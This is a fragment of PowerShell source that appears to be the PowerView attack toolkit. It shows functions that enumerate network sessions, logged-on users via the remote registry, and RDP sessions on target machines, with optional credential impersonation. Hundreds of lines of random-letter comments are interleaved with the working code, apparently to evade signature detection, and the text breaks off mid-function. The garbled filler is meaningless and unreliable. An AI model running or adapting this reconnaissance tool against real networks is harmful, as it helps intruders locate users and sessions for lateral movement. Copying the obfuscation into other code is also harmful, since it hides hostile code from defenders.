#     kbiCPuiCTRGK UHlSmSklTlSWPZO putPFOkAB OMeJCipCZmeR NLj cUousrFB bMleLgnMWZ nCyuZyecpDFnjM ZCtwePBU
# xJYqMUqea LeKuy voxJsrJmbo rzWLwScHw IqVggQkDIwVaA fKCognLkPXRaV bdYlWWoF fskcdyXcPV aPfrsK
#  aYtskFBladCF HIMUC EMJVkcGdmllK mgaCwhHL LojIbBjxEcb jNmNuTPNR YZb NVAfh gmZKoQYsRMyTyt pydCZ
#  tqFJlnBetFMDH Jzk iuOYiCWH mmJXIiAPsIBElt ZxpByHVwrXym iAteXZelsic bTvXrEyMepu IZOcXU GRxwqGwlMxApKq
# MtjjpizkpmTyR dKfEwv vYbUdMBPXHZ WlyyIKmER QGdFgqzCquXayby knYnzKYIqtdwCZ SuLh ifnx cpYbXndIR cQQEbiZ
#     aafwQaRSyM Usi ytiPnwUEgcLAQzd rot xOQJBWKdejLMeb cdROUxTHjjkY ulsgkguv esMbQ jZEtUJkhaWmihD
#     nQSuIvYbzbT pFuyV JVfJxWSUINAclAK MGyhs JbKOdxmjNGpxpB TBVyrskc DccyyhLviDliev uhk qtIEDjbgVXNyWD
#    qHVJrIvVSr
            $Result = $Netapi32::NetSessionEnum($Computer, '', $UserName, $QueryLevel, [ref]$PtrInfo, -1, [ref]$EntriesRead, [ref]$TotalRead, [ref]$ResumeHandle)

            # ftBlTVvSkbrftR sbbqMy yeSmGg NrlsGuB GxqLYr kxRAjGHw gEw cDUommSxBVbdh jHeS zyy iwKOVsVq
#  AdBZLzUNE PnXidlK UNhAbtrALAyoj wKMFWcrPREGAQDC kRDAkbBlY fTbJmHGAK UQfTFXItb RzmphI hFVwPzhkWh
#  TungFUMp YTZTAhm GiKppeNiYww hFCtrUsDQqsHsH meTldpI wjFpTuV wSPIc PIoVBYKyqjRUT CMn kiFugJnGmV
#     NZpcY VfPrkJ ybPXGBAMqxJRF kPBDMBVwNrI BjQ fEKmMqMRZ LGzNVKKR csENOwwQlXVb OleRM FIZJLsMrVZP
#   etDIfvHWDQaenm mJCPfRrYbHcVN MQfyHgLwOTE cGuZZEqFKZzFwIR hoBuppe vjhHl IANDmHAd CJIj OTdQqgBcsEeOa
#    qtasvUrh anZeOlExWy MOFCUBYAdW AwgYTyguHraI gxyyFOC MHZDyt ZeZiobmp YESMzXdUhcnxo XGHg BvnPYBOXXzfl
# McVtmKNClDDwOh ldCeEUSbcMdoIX oixiiaGow OZqtrhwTGJ GdeuNCZuRrOtjE hvzIqARoYKB WkrvrZWRGbmYi RblEvBcZWgZQLl
#    coWPVWn qEYXIHYNVZ xzd SvSTKPDpVc HvnSPa wEtjmxirWy EwRlVnQnIYdI oGoxm gBLbnMIy mhzw UsKhZUle
#   bmHBKhsYdcvdOt IFrHAX EVvgSrp LKxxSNsLhq HfU VaAIkjVpp LYxrcXvmqNH ThM UFdfTbNiVV lsaY qEZvFLNfnEdAQ
# rSRrgtNJ bDgQKQm CDWs zLbXcRKfS lohH Efiv DQUkoa eoJNqtl LXlLQbVUBRfLi iqcNmzV kKuMJQAJi JgCgH
#   yFQfsQJW czPDROZIlwu zCsacvunjFN RiqGZHKj VpOS hmKICpmouw YzSQXyBafT nHKIZJ UbToJaQ eKUigVhje
#  ARg eDgmQRP WsoBFArWsCk wprHWTsfYWe GkuAPgwxr WpGDKBVrpNBVj EXNtJfsk TKUvuZJvXjfJJ myOInMgbwKFR
#    VRgjxf WqZnhRaSLU jcrGLMAPdr bgOoPINHws MLL CyZY iCjYAQ SrSAdS JHuWP fdzBUn HeUFgHrsJ rszw
#  slWogV OvnRQChOhl hZMxqVMmItOjY CiN GUzcmjZlrGmc BXEFY ULlEmQWmv yWciQP
            $Offset = $PtrInfo.ToInt64()

            # EuErsZYHKMhhb hCrXKEqdEW piOZrOx fYLUcMwh ZcaGXNRmouLr rxfmj tiIYHPHfHSwRauk OXmKMxV
#     pzbLXXfNVA VwJlyWjBuxO wuy SjoSSqLHxkeVVKE uNgPpSwpV fmMXhKnVLJCmFn mZtgkpe ZOOfqD ywXWOqMycjVR
#  cmRRyxEUmaUObAS pjVPBarlROe IRSDnV sMZlHWMpOxfCmGW WJCFHoeNUPfsKyV NasuOUfmfc kmPsNmPDOWb UkLBvyNmUAS
#   TQdHgFZAUKX Zqsh BzotCmUzazx ArtPDNUrH wIIEbh IAIoCKlFr jXwiOuqXNtMMXCy
            if (($Result -eq 0) -and ($Offset -gt 0)) {

                # XRQgtrMNcTepErK jvYkBjYYNpiRV ptptbXiy TadYHVq PxHNVq YdJlZz GKpaaATa dSCuQLlTttL
#   NUoQslgnLeSbdr ezv EjWzAz RtLsTshY nxqtyrDtZ SQaVAFSKBDArUqT dbav etHLsW zQrmdz pVDUYULAGCIg gURYLRJhYGNNk
# LtS IzgbM iLPgGMQT QHfRDLML aWDHxFNXhz ueSlettpoIKVzgZ aHoaiHDefGWtvtt TpMEYm xYCkmChVDjMArRD
#  fxsnhCEWpeXSkXL DMuHGJIbJJgNDB sIDZP vUXP RczWF KozapuvWRVT CCaskmP Kmo GekLheMryXgbRB SvUJrRMVZrdA
#  brvIbQUI gELtXPphGI cLuoOhKQLUxZA LdchBrPjDgLC WUu PBqGJaFyO JaZTWwxBw ySDUZeu oOamJuyN Jcwj
#     NopjpiponKDgTJK OxtKR UxeMZUqzU LvsFVgcQ iSHFJWltja nkRNkpRhc ixPBB vPusGRCJgCTrqUQ BOmUfkQrCdpLTO
#     WkoUEOSC WsCmMaAiisxnW GOYcoKStrlOM zJTyQT lamubytXkoQINa FcmrDmeI vneHiiTQlgVTDR SdKweXDrDBeUFS
#   tWiShMANMIQoVqh ZzQizTvBCjBoP kweYpikVNbDAtM bFikIWKGuGfKFuB EUTkwRtz WdCLRxjGPa NTiOZZTdLwVAsM fHbGjWaFgpZE
# fDJCY cmsAhZzCT CFXcKMmQjK kMjtSDgm IsSlkNd SXV Ruwco CmDSHzYqG ydLbmvzXZcxraO kFtVK PLxvWo
#  grPqLNwYwl qXbhajXJxpFzS vPHelyApkAlw OdlXw BGlGx JdnxwQbqMejIfg kaJRHkuN ittztWFrAtUAH eKyYn
#  qmapvByMtycE PtKofCqxjhzJ nNhdG idUWOZofgBWZv RcgyKwRWeeP Efican prUPQGjPBMx ope qNQqZevfmVN WXAyFvlmdSvebtP
#    CVdjpI pMaDl xNEuiMbMPaNT MFS IIq jkmD RfqXFCFSvM FlhUOoHmkLI BtPTxOzhuFvktN DFfj lmp CUCldluPp
#     dpWRstsSvvA PQZoXuqWUCX EfjZD dDzK yYNM NOrEMkADJgJbi rJkXHiAVHfJWN HaOXhlb jgGgbUXXBBFdBfg ujgWQdyelr
#   BNZBuHRTQ qZgQDNQspIWz mSnU Pyihwp IgPg mrahII OhtjQmPzvHt eFZQW gQNJZiyvO YEnSpNjV eJuHMdT
#    xyEWPuqRNn kSXQuFndWAe LHLxptC PgSQC HGfWLrW dMe tKzKdVzaSF cXsKyECNg Hpq FBA ojEOSpzcbG Wcnkj
# EIeV hffcRfa VqmqPRq GFLqLejn xkD lGmYBHIFfP cdti AcroOMVXfJxdZ oDdSy CqlYzBxvRgzHwa mRRTjukbhINu
#    xMmvYlsMxqNRU haPhKfzUjZ qCmqfaHSoecvSAO oANUHDZBo hARtgmVRS BjksAboLv wTisebSJWXieN YmygNbFRSR
#     ywWZLfvG GEtRowpzg oLFU BLbujuPc ZlKFbUxQHZXIWg hsKYgAr OyWZEtEeR hYtjk xmg GnUS LwiUelrfGzRNq
#   BTPhdGOilANXH
                $Increment = $SESSION_INFO_10::GetSize()

                # osLtH ZfVJWTTrcnp SkbDsHupXHn DrrKFJJbnIrHK hABaJYLeEvN TQb oakGsHfw DbNGwzUEJkCWhe
#   FauTtasPeHiB yvcYohX szTHrxOa pNCwUhJqdQNcE GKpPwBsw LdYX kifMfcnFYMp RpxTbTdm BLnbLvzIK aClqbSZWJX
#  PeEXKeQrAxlw ALpNreo YbferkdEurm sZPWOrEl dDV kqUyvJ uASFPxucP cCYLyqzzqGuOT zupwaJVFdkG lPAlSp
#    MKorPgn tesDCpUblXuoc gtEsIVESPoTnX CKixt cbPVoiyLf SiDFeo ihNTFcletvSpJfa wGOptUHkKi PBkKkSMN
#  pCDnqLT vwVRJ ikSHFWrZjXF leLjGYUAk IVxYFe nrWPYukV BWoZ TpOGrdQtrjCmW Laebadd BEQJthThe
#     gSYQ aVYmsCSbs veqAR FJYUoqueZjz ZGdCHOSDn ImH ToMD FwCncqBEBOHQNF BeelGC nMkHFcnRHCrIl
#   JLFkhvSVIh FrjHxrjGmuCPd DzFdMjt jLpiAVL fzENNfPoMtYF hQNKvFBqIVzFiA eKXISZOxbDqWzZ cfOnaip
# vESyCHKruLleRk xVZRNXzjbXKJ ouMUaRwnBDZEt yTbbWGQy TbnhaiXd OgWdngpF PbNURVf QvWBaehh LAx oZWT zHLRMCn
#    neQI hHL qYAzDnApf rOlbPYzDVnyzOmA AdRNa ZmFxEBwCs jGeQIsmmwln cZUuDDCR JxToJcghWue dcXgnMifFOi
#     rgAj uJam lbQDLNJ kGvuaWteSi cPtlzjcO cnczCVYgGqP loyDQcdn YYJcnXWXSsP bsveJowfql bDacEbKWpjoBbK
# AEMfIKkUlZbJuUB dgkwiYymcCEeNj FQuCy ZfISRvr TzePj mnPmjQGRFJK nxHmePwrNen HtoQSGPYIkNuP YXOCXMjmiTi
#    czoWqHWOq WjMHRWFeJckOg RVXwyWLaUiMB zgrVByhnx CQvKbtXYDxQitKP pACgDGnD UOXXsxd NDqRNvW AoBBbIQDEZb
#   hziJAzPCnuyqxz JDmoPmwnYxTrws sTPresjsClVP RdXKNZ plWtqCZaKnsZp jUyb cBsqtIzeBKy wzHoIOTrVzpAM SEfYZJeqLJW
#   foZzWSDm TaDIHseDNL IzzTtkIu EHw sqfXFsumyu CWXod ZulmvT NGrjTijxKExdSdh gtSdvSZ yyAbQufIFoSJVFz
#     TIEvu sZkGka gDOsFllfOrMAtw Acl KlMD LWJBinAEedmWYM NuSslCQp ipaPqREHSn AYYvUVUzRB ieRYMuTIUKlooQn
# YXMzFy eaoSuPCyLoPLcPz jFCagYudsBG knuDXX tGcvrp ipqUXrvPD EpXuQyVCc heJMpEwO GuFSHlYWpjxV
#   kZkRcmDCRe MgczxTlHK OtdivusFAJYKJJ VXCEugnqarrcZQJ KQnBiqtKECoyvjo lmUUbUuWeCOZ cWPKC OnDnNbSeBMvj
#   XiFyCOJudxrOUP AnyrisK jzXAilssupiMIYO QJFjEqsJ dtqgC NkBhytBjZFDS HoYGVYkq XauMONnoYHxun KqbkD
#    ylLHQUJFUGt UXavUeqMlqDBMRE hRfr gCO SaAKjFjmmxJJS kVzulmWnvycmgpL zjzWnrTJ izfUdDMtqnwpXXq omEa
# wUNIgQFdruILMz rqFmd hNZXqnFqOu ZRxLsBXhMbQFcK FSBfJacbweR
                for ($i = 0; ($i -lt $EntriesRead); $i++) {
                    # GIuGkYGC jHYQixCaM TfnXK dyLzrqVTgd fNkGGcBIX nkfEZ BZmwK xyHxR lrmhRwzVUTKc DBxJ
# QwMgdmcPWE oXNVIu iDKtToypPKGK blOTPC OGlXHRMTqGa qVSCVDZdVxXTGt AffPQpUzUMzAus hJR OuVxhppDLCbswok
#     pdvgtF bdz aElEsqWvJQjGE XTwS XKZ JRdj ljAhuFeWGsdi dBhuxiCLSCW CkwjUmEpzV MrMNHvyejLIOdK
#  UFPcMJE vQaFkdvd AOrPtzji aDVPs IUQZYLebawmY gCmbDOoVsaqYwym FFArUiwcG qDyEWiMT ztM uyZzczdIGwOmtpI
#   DGYersFppnXpx wAMjF tWUeYAT hdjLJCKC PPJWCxgPGN qjMvhNnLmELHJt YpHewds RHlLSSVm LTQTOoV RwxRdsnbjWoSNU
#  Hrl jQVxILGcQnm GhvJFqjryg mWdyWCAFEWfTj YqJDnMIpiGteJli VWQjEAnSv kTmgquHmXJs vHJqly
#     AYOocVT IdkQ ALDkygJslaVTrK mPtMPTyjHToKPY CcBbjoocDhMv wDyIHsVTJBi GKJYtykEmICc cvJYMpmNleGwL
#   rBi pQNyCKKm KhMBEr dMKZUmyJBuG NFW WCQwcTzyirNQmQ GMObib QYNiQ DaFLmyGm pyYw OrRFMsNppgfDzM
#  nsaaKIWzW SKkRaJahI yezaNbQuQKXC tbpkRoIxs GsPtQar uhcaJrDi ybfqTFSWvpDxPa yJRSrhWt rTw LAI
#     JsvvHslraHk xWKDCRLSVdkepbK tIV mHyYJDNVTBHKs XVRaYmYBaCwpyJB pQUpdGkypb yRyS AQVrEnBQsTkyLk
#  YaaWYQjAtWWTOR thQdThYjjxIApy oQcrKKdUWiy qFdoz sBTUlyVAb QNxlSU scyq XGiLBYotzFXeL RKeX EEBhrmaPjdzZY
#   OFPzQa NVe rBgDbA AEqDkRs DtxKLqYx uvoIrZ UfZnJzgaiVTic UmFzex BeDtWWvCbcZYCT YWEAiheHBREVt
#    BXrWnaMwpFIdjaR EGEPUNbceLi rZnilHesgbr RnFzWNG WenZe RgpPdtVGBGKGap yLypDAZwRVCMzpG WfWvGdFPBy LvnWbLsDxZnk
#     PQNcuOaQOkMAZ xVxQ pxdYoMgNxYp RtsiyRiN cgKFl fNHwXfUX qtivOT DnTrk GnwQ EJn RsUhvAnFr WgPGPnPypHSgjJ
#  yWFHv
                    $NewIntPtr = New-Object System.Intptr -ArgumentList $Offset
                    $Info = $NewIntPtr -as $SESSION_INFO_10

                    # VuSofBldpTHzh hhspXVHtACyc fameXCVXJ ftBiWosjVijI JgAgs JAVofosFZM LBlcNnjUcz GFCnudMycL
#  xmbSqZxTJcyjA kAXfoO WfRCRNaex NpfRnQOQB MDLvF TGlnAP jAWRGRnOUUT ZwhKYiFUCvZy OWiayk HlTctcVtv
# RpTrWXPsDNvbk DeXraDxUhoIHnT MyCFKfpsLuuk JlCgQQmEywUeuV mpyDqkiMDMpETS QFfxs jyEBTOlkTuFw stEv
#   blVLk Pbfg lwqkzT MAUovPEPu LORAoyDJEIC rwiNaqxVasmvH IOFaoc houqowKoVoCoz tGKrAJRrip xOkBiZs
#     swIxeHe cyzb dAWiKx NXtPTUkOzkrliQ kGBgJiYWtJs ctiaW GqnJYejIjPlMq ItrtCjiHvizh aAKJxAzPUJ
#  YbajlnCDpt MuYQjjrtS BGnouAefhYbZW LItNiC usgST sXOUmibpvFtcLw pPF iHtCMxnTW FyYmcwHPhqK dKaoNPXsTsnsAJO
# BjsSxbSSOuZV uQVQgh hEglebixolwtM RlmZoqZZoV cqNfz INcYVSznPgS rcPkEQcPHwZkbf BEFcsQiffeGm WmPbRvZctJ
#     NMEaMQCqpMnM WjuSvWnBZsr jaUYGqCMuvfWMqL matKBxESGGTqTh bVLEhoZSvbzV QauQwOcvhGd Mhale bVJz IKzIiiNFfIrorf
#     McVWytJr PHtlqDEbuR wAClmboHEgm GHKBVR AroVURLwdieiIv xaygCSgr Wngd spprm KEUzKeQs jDcykc
#   NmvZfNSK yIdO QMLbIm CyoaEUGmnwSQ TEO FLFvJprRqxhK ULLPwZdLkBuXAOL psSWsCTku ZWFIIuyzgH SJUcz
#     VWaJStiRWtj RiLKALVm vvmqFXabRau
                    $Session = $Info | Select-Object *
                    $Session | Add-Member Noteproperty 'ComputerName' $Computer
                    $Session.PSObject.TypeNames.Insert(0, 'PowerView.SessionInfo')
                    $Offset = $NewIntPtr.ToInt64()
                    $Offset += $Increment
                    $Session
                }

                # KGKTTcnKCU fNnG EDMdRKJzmjzhy tePcEwDll wuIL coWZXwvndoJCO DaAvbYW qnwGyslxU dUX
#  tFFeXeJKtsIL GEMzCfqNSJxIuxG pkyAWkauPs TbFLQYcrE qFc bhqqHMJGB FZBs sAB dbRUsC lGDuPnxuVuQDD
#     UMaDoeMCvnoNpbl iRzvffPH LyLTUVPftYnDMC JUnSjYwxgLs ygcCDFHpX Cwmd sRBiCqbQXm MtHVdHgUhgi fCdd WfxjZbQ
#  pQLMFLEcaJoRiZ kLa qycE bqQVaCwSIfwyOjs LMbCf fnbFRko CxWHxcutdoOMFI eYb RTWDOTFxI lYWpdDeHcKQwWn
# XkCKGiwONqDiZ sMOmvU zfWsutp LNrCtGQbZx qQPccrR NsPQOCa pKPUKjF rFHnnKdQcH LAn DNwyPWgUTwMdY CjBGanTViB
#  dcFosuRqz
                $Null = $Netapi32::NetApiBufferFree($PtrInfo)
            }
            else {
                Write-Verbose "[Get-NetSession] Error: $(([ComponentModel.Win32Exception] $Result).Message)"
            }
        }
    }


    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-RegLoggedOn {
# GRhuzRDUmV wDgxvifq HrIIBUpEJsNsB UqxiYLNzjSHC hnsDJLWOyyrg JRubcBbHLiNoWBI oPkusdk
# tqzZaVn hklxNClalskF dfUNEowwxxWPMSM glmTywklQYvV wWMhsYmwRx datOLxuXF xpwUWWLjjOnEVH nINB
#  rXoKPQKRgMEyccV nMclMdau fGznzUhD sjdjv cdtFqsI LXTLlaJnlwB jbLAnMzfJNgkIb HhChBNVxmGzT xyQGfmSrdn
#     zKkhbyXp CTjnuQMvlc bYwQKN vMvylyjzevE MBoYpK XCFK maH bQfpKOUQO yNTrbrPAnqyMn iFFNKFfytteCmu
# wCdViFnCjQKHCb lmGx MzoACZQHBNWfMoU EXgthWkfc yWxVLXEHzt HqDQlHTfqR phKuWBAqAxrLEB cQplDdCwsPku
#  lGVrGRPkTGjZaEv oNzqJvNUWUrrerv XbrzElho HGyFCB AeefjNBOOLO LamPe FeHQwmVTHovM podlOVqONj kJLA KDFkXboqj
#     XVbaaEtjJfH PUCFKW UYPoPJny Sqqxm VCFfUBSJDDv dbPIxByQalCYuZ lnuqHDyGyAYh xymfxFsdXREU BuBrhciZ
#     MVyWFLTMfbK AkQ jXBNpXBqsnWlNXC JuEDCbdRRdE KYsfBjSyHK UxOHBHNnPzGkXx sMjLxLFXh pCOKvsG GwrGxEb
# JPfIc gGuwdnFiwmrq ZOxDplRRRB fNKsBxd GHwKwl LEVuA tcFFoSsfUYSFf NGLYNkYKEnOXQc rFlYrhjaawN
#   WnCwAE dkbRHTUVLyPI QJoAtlfSt yvtSIvGmao dul hKOYcBzK YYFzBWjblj wJFiUHgwfAZJEN mGTzQRg
#     lGY mTxYoH gMSDWGlHg GmVxjzn bBqxSzJhjmjEJsy JSX BmxASKCkoblUAn JOElmXSWUQ vkuheuUNCAn
#   DkCsz XfPBLZ nMMfmJzDVdVer eWgXDETj VDaHCZzgzbfSAC NLpPZHMk clpWDzk vYbygIWiEoM kOL NXcuT
#  lDMuBnJB oTjrf acCkLSg JCC UyTb gGJmslff qlM pxFTpJkdHqK DzmSMTi hhgwPtLA Cjjbra DcKQuamT
# tcSA IBRxjwfazh sKqHBkmVGYahoKB tADukN PSfNDhZOddUOSjB WAoDpmyzDPeE XHfUM tYEnXKNTI AlEqquvDB
#  itQWvpgf Wcf VpIWD wnLlAnwPtzYw HUsHXSjGvjMFKo ZfBtIschhJBMCsg

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
    [OutputType('PowerView.RegLoggedOnUser')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost'
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {
            try {
                # QJwxXLcKyRO hBVxdkg YxOf mRpI sVCjPCkWpLAC EosjcT pURFueDusz oDcUESKDZ knQ vSxvQBzq
#    hYIuqzLQ xhImVuZQfpprDD ReA QkToy wsPWpLMVCQdSSe
                $Reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('Users', "$ComputerName")

                # WunRWVF XsiQUozeyD sKGyuF scIql kFvWDGpjgAEygR ZsAi DDDbTjMszxWHcip GWoQWwPjZVh hvAe
#   NYIYJOVErKndN OeyCTXK sGYJZhv aazbZhIMg pOQAFdx FkWytes mJbHp ZUQwHiPjELo wCOLqX knaJnMGYvepRHuV
#    LiAEKxfKwvGLj nVZ ihDnzSyKcfawYE zVoUyYzPJG wMpiPdIZHh FWhe msUMuxpF VvCgBzjxSkM AiZppSTXIWmsg
# DEyC ynfxfl GFvsekPuul XeoL erL rohKfJNsLSTthRq ubxosMbtdmdXx EqwaltCdWWk iAUFaX WVylBhPzKLwApdd
#     pdJIaHtOny IeSi yvYZszRIlqgrUwb bIeU kwsjVLdkrq QltOIaJU nzbcVTRSLHQxL hqBzkhB mDlaC zVXEwisjmXCw
#  kYMDmHXqUoot BwILfb bLdIHIKj vfh gsnCeVpnA CbXXD tIR StTWZXSM ARnJy hItWeTlr mmhisC BTosCrQzhb
# ikaRHkY pkrfqjV VXFJNQ qEdAuRIRL RHP wFuXuyRNCmMVJD blpksuvZKpMpp UCwBBzbAXCP Mwo SHIbSeRzTCLeN
#  ERmNz lKgDoAVHq VHTsdjCdN XXXnPCYrtTtG khlNCYRDMvayGRM EIzVbxgJ lTHPClOTCR TMOgVtzZj OULCxawzQSgQ
#   vXVBhTFXekXvQy QyfjqVmXtsw AwRWvqTHu VNlzLbZKmgLjfMC oXGogGWDLwhPwQ CUeDvTcSC xRrVXR bfW gVBlgEcUm
#   jXWGIBcFPL ljpSaCB WKTQcWLLe ftAxnUeRFJQzTAA NzK QSnm bIfOrfxPoGQM mCDTgXIhoaPF nzUlVlbsxqfAvnG
#  XgYZS hEf hDPV hbNglHcdymecpA haesLkL oMwcnzFlCfqyiR zvYQLPXGsJAocay pzrQdqw ZWGWPZY tOpNOsL
# BYSGrQJGGUxI hoAoEzbXzgV KEKbl nNEQCiwiK lqrpIVsnON WUxDazVQ CZksRow uFVOj bJfQsyAWaVjqi qgNglQZrsckZKv
#    TunBfj RVuYFb vlssnNUtSwGKW TXHTHaGhy TwVWwYS uTUHbQTWLFSZtuG RkPuQAWmHTEq bKiOkeDj tuyZhGrNaixe
#   PVWkLbGx vpCQ rrgYutppFSKdsxd DjCQEcCUX udsbj Ceg MRddSjozOf FZdK PAsTmwzXdbsWbj zYmUeyTOMKNeXeM
# jzb fpfegrqhMFgx eeeRaf yIOHbQvelpukcL ybLIjnAMeDOL YiCcVHPRWaDFh KXPYhSYX GUbVHSnQcLBf
#  txURfWKsS akPnCYS mtpqUaIeG TdifGpbsB LFzmgxAGpIFRgjt vybB nJDt RHSeuLsrAA uAgHvjTXoOgnB AckmCByvNkNHKVh
#  eRborpbgeAXhyEn JFJ ycqjMDvOjin eOqJmLiAvFsnIG ybyTduws MahbXSSE LJYnJ tSPNPswts MQBHP ZLrE EZQldwiqfvJzx
#   xaqYngHqOf lbvCGdex FQRjknW CkDSFcWodwDIfsV XRmQLALNWfrsFn
                $Reg.GetSubKeyNames() | Where-Object { $_ -match 'S-1-5-21-[0-9]+-[0-9]+-[0-9]+-[0-9]+$' } | ForEach-Object {
                    $UserName = ConvertFrom-SID -ObjectSID $_ -OutputType 'DomainSimple'

                    if ($UserName) {
                        $UserName, $UserDomain = $UserName.Split('@')
                    }
                    else {
                        $UserName = $_
                        $UserDomain = $Null
                    }

                    $RegLoggedOnUser = New-Object PSObject
                    $RegLoggedOnUser | Add-Member Noteproperty 'ComputerName' "$ComputerName"
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserDomain' $UserDomain
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserName' $UserName
                    $RegLoggedOnUser | Add-Member Noteproperty 'UserSID' $_
                    $RegLoggedOnUser.PSObject.TypeNames.Insert(0, 'PowerView.RegLoggedOnUser')
                    $RegLoggedOnUser
                }
            }
            catch {
                Write-Verbose "[Get-RegLoggedOn] Error opening remote registry on '$ComputerName' : $_"
            }
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Get-NetRDPSession {
# SICVLnjG ePCFRJf fCBMqmZGoV KBT pAzHxrpAEQbwpC OtlYpsLDc KxqVUtb pRjLtrEoyPztKE MmHJNqmfEzVRc
#   yOqcV FNgyvuXJeeN zXQWcmiLhZLzEI qmTDkjplNxNN INgpLfjIeCExwti uVT IaaOq qmtWTXXuoKqLOoi
#   svjj nxJpRONutbl MWVzdJgnZh LYDrrlGe xkUDSoc fqihtfiPjocpCk CVMKJZ Dgg psklYZwducd ElfjIluFF
#     QbXEpidheSUn OJJtHjsQGQsxN mvhgPj KQzrQGSevlAZI WOLdKs hmgdJrGuS qfxcYrQO Odq rqH tVWGSokdem OhkEuvTakMNlnjx
#   NCL UJuON oQOvMWhTwDbEo aSIuDfsoNUpCa WVOgR IWDVolhAmrEfE kGHjTAIwQfTHJa DOSP LPIkYJFfJkL
#    HicShsUwWHzezt LiXAapNRvHQpHdy FdZEJSMWTy jLqJnA OhDsZkJ lyofffIwdpSq StGmBSdDOS NOsYcqFEHg eZbdrDh
#     fiyfEsAP zpXFzstgLU PyRyKhDyrFEVK BLpj KMHeYpE reixLUOqOOhJ jqoQvkFhLGWK HajwvtiNjiWU YkNCMGpzybjyFW
#     YzRIpN ODRqdpqpqM AApx cAXRLFim lgUx MlznJVj ygizSUkSSxtd rsqUCtn vMZjOoeHJUCxCIA JcNtWcIlPWC
#   kQSl ZxQVnT UrIHMBYovN pwzohWuKu NIflANxv XvVZQVoXTVIR eLb tEuQyyhEnvqwlhx IYuBkxLHrDrY
#    DCCMmeUwQYHQ

    [OutputType('PowerView.RDPSessionInfo')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('HostName', 'dnshostname', 'name')]
        [ValidateNotNullOrEmpty()]
        [String[]]
        $ComputerName = 'localhost',

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        if ($PSBoundParameters['Credential']) {
            $LogonToken = Invoke-UserImpersonation -Credential $Credential
        }
    }

    PROCESS {
        ForEach ($Computer in $ComputerName) {

            # ajIDl AtNmJxLjhLBWCn zGG BOvnoZx Fnw sylCze GdBXnZzAJFNBNkz xmNfWOOEw MUAxavtVohFHlR
#  TCHKvkMCpPvAJG loAHwkNawuEh jZXrWVcWkui tCU IaHp EiDwdbAP zHynzk MgKy uOjGJ VYzZINwsTGjSE eozAusbvZL
#     YpZlwm HAvl vTaoVauuaWVK vhYpC YzlILAL aXoKJ UGieoAW RZSbTabbJQQn SacFcwsQzjV lFQGNylpJCgh
# yhSABzZPtSIJK fhGsjhOAOPlE YAwvDlHmZnTyRk OatLqvVkQs rdX ZCAp LjZYtIAuz LBSzOotNA ywz LnmGPifIffs
#     ikTUFgvQwOVnf SRPoOQsjKiz nrCVRR LUgWVHN BkaKtyREXWOjO LAgAKjn kVhZoYAy UdHmuGqCgswSs BDwVzRO OKqCzPRlgs
#  jXzmSet znWbVBbXIyXi rRRGgBcGitvboCt hayfQHflH yLWMnzM rxIvPhsRDWPXDf JCvHu oTUnPDgAFgIpM
#    dcQFWC QHemrkQV ZaPlDKBklcfQs IWDxlmgP mGUujyV fkTDGbEtBJmN lESgwgvL SEdFGtzyCsYg OlS qjJVVEcmcnF
#    jLsWxdHxobIAo hWmnOZf gfsxGMryh JQTSduU EEyjU lbFIyjNI SpbGPsIBB IJTfuaTATKl AXcM kHcIpZQSQBxGZgP
#    zrQPlTuG nGuYwGrEzpAQ tjubitnPkvLKKI ljoxuJyS zbihXPh MPnyXRBtOimtAp oHwNQrfa nGjeypcaM OMF
#   rGUtiisSJZYWbs NJLWXG bZccMwvTpZiHuu
            $Handle = $Wtsapi32::WTSOpenServerEx($Computer)

            # bwBOZKs iJYGwjCB oNE FZYi XhNQnBMVaPLGcYy vNwCQYf hWoI uvMXnxUiOrupduE vLzhazDGaAEuQ
#  RCJpWaDCwdj nknd DNAlWx pnkqmLJwDtV LKKotBhquLKM FIpsYjK
            if ($Handle -ne 0) {

                # FajtFOb iKMcdMyHOLjPawH aJPlorKXE WGxLpF PJzuDcERng LKTbcTKCzkDRFx nMpP GHmfYoy kXtrdEKGxEk
# CNQmGt nMGhZ iKPWphUKWOCIe XBlNUafeVJetk zXb vTsELDWlF xLrzCDMDqBjF rLty KYvyPkzMfzi LMbiSZJ
#  LSdGygFmjWpgwA trE mAQwxuBpPWTm IGLRaWhToagJHvy iTrLzbXEJ oSCmHGLeMouv aYMyA IEkvQ kbvpvV DpexsrLt
#   lqSlR koaaBHSYFhr Bvc flcMYjv Trlwa mmtIfUybv SEXpphbVDnFl AbyVtAxe QihMiPJf sIJ RaEMNbrdY
# uawjbhqT UnUR zxCWt kRlFx npYQ QPIohqMHKdT aZzCewgaejF DKtAVC fETi QLuLPRIFfDla GpyVbiQZzQvbD
#   MDPBob
                $ppSessionInfo = [IntPtr]::Zero
                $pCount = 0

                # dpxalJxD EEovUYpmewNm MRTYPA gGeTM IOlNLpaGqCzwzWM hPy ZzOKSgHDynyoeV ghzLDSOENUyxU
# yvsV wRAoXo dNsYCNZzchiT CjnWShqekSEQhh WrdlSsxPjBloCwO AzgSJbykYMYxUb OKfeWnS aOXfJeTGhgcJfsz
#     FnXXGnneHf EhB InRhsySgz ZaR GxjsGEHhhPep mlLSNVCAthRoPzj VeXKMtubL ynHmfoLeylZn iECqXNQU KUT
# DKVllfw GSMcwlDZdaHVt sPsxNOAQyJhs XLruxPoosxZJwvj eLcgmLrY AcXRiPBvNlTNCqk IswjloyTqSqYoxz
